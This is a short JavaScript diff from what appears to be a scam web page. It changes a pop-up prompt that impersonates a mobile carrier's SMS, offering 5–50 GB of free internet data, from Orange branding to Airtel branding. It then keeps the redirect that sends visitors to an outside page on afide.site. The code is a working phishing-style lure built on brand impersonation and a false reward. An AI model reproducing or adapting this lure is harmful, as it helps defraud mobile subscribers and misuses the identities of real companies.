@@ -1,5 +1,5 @@
-var password = 'Données gratuites'
-password=prompt('ORANGE SMS: Cher client, en tant qu'abonné de longue date, vous bénéficiez d'une offre de récompense allant de 5 Go à 50 Go de données Internet gratuites ; cliquez sur « Données gratuites » pour vérifier votre offre dès maintenant. ','Données gratuites');
-if (password != 'Données gratuites') {
+var password = 'DONNÉES GRATUITES'
+password=prompt('AIRTEL SMS: Cher client, recevez gratuitement entre 5 Go et 50 Go de données internet en récompense de votre fidélité ! Cliquez sur « Données gratuites » pour en profiter. ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
 location.href='https://afide.site/orangefreedata.html';
 }
